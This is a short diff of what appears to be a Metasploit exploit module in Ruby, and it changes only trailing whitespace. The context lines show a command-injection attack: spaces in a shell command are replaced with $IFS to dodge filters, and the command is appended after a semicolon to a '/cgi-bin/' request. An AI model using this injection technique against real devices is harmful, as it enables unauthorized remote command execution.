@@ -55,7 +55,7 @@ def check
       if m != nil
         return Exploit::CheckCode::Safe
       else
-        return Exploit::CheckCode::Detected	
+        return Exploit::CheckCode::Detected
       end
 end
 
@@ -69,7 +69,7 @@ end
 
     #replace spaces with $IFS in CMD
     cmd = cmd.gsub! ' ', '$IFS'
-    
+
     begin
       #send the request containing the edited command
       send_request_raw({'uri' => "/cgi-bin/;#{cmd}"})
